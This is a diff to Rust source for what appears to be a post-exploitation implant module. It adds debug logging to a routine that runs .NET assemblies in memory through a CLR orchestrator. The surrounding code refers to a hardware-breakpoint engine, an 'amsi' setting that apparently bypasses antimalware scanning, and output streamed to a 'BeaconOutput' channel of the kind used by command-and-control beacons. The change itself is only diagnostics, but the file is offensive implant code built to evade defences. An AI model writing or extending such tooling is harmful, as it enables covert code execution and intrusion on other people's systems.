@@ -195,7 +195,21 @@ unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pi
         };
         debug_log::log(b"[runner]   HwbpEngine::init ok");
 
-        // 6. Build the orchestrator input.
+        // 6. Build the orchestrator input — with our debug_log wired as
+        //    the diag callback so we see exactly which orchestrator step
+        //    crashes.
+        unsafe extern "C" fn diag_thunk(msg: *const u8, len: usize) {
+            unsafe {
+                let slice = core::slice::from_raw_parts(msg, len);
+                debug_log::log(slice);
+            }
+        }
+        debug_log::log(b"[runner] step 6: building OrchestrateInput");
+        debug_log::log_hex(b"[runner]   app_domain.len=", parsed.app_domain.len() as u32);
+        debug_log::log_hex(b"[runner]   asm_bytes.len=", parsed.asm_bytes.len() as u32);
+        debug_log::log_hex(b"[runner]   mode=", parsed.mode);
+        debug_log::log_hex(b"[runner]   entry_point=", parsed.entry_point);
+
         let input = clr_orchestrator::OrchestrateInput {
             app_domain: &parsed.app_domain,
             amsi: parsed.amsi,
@@ -208,6 +222,7 @@ unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pi
             mode: parsed.mode,
             main_name: &parsed.main_name,
             asm_bytes: &parsed.asm_bytes,
+            log_fn: Some(diag_thunk),
         };
 
         // 7. Streaming orchestrate. The pipe-ready hook captures the
@@ -215,16 +230,29 @@ unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pi
         //    reader thread that forwards bytes to BeaconOutput live.
         unsafe extern "C" fn pipe_ready_thunk(read_handle: HANDLE, _ctx: *mut c_void) {
             unsafe {
+                debug_log::log_hex(
+                    b"[runner] pipe_ready_thunk called read_handle=",
+                    read_handle as usize as u32,
+                );
                 let h = streamer::spawn(read_handle);
+                debug_log::log_hex(
+                    b"[runner]   streamer::spawn returned thread=",
+                    h as usize as u32,
+                );
                 STREAMER_THREAD.store(h as usize, Ordering::Relaxed);
             }
         }
 
+        debug_log::log(b"[runner] step 7: calling orchestrate_streaming");
         let result = clr_orchestrator::orchestrate_streaming(
             &input,
             &engine,
             pipe_ready_thunk,
             core::ptr::null_mut(),
+        );
+        debug_log::log_hex(
+            b"[runner]   orchestrate_streaming returned ok=",
+            result.is_ok() as u32,
         );
 
         // 8. Drain the streamer thread before exit so the last chunk of
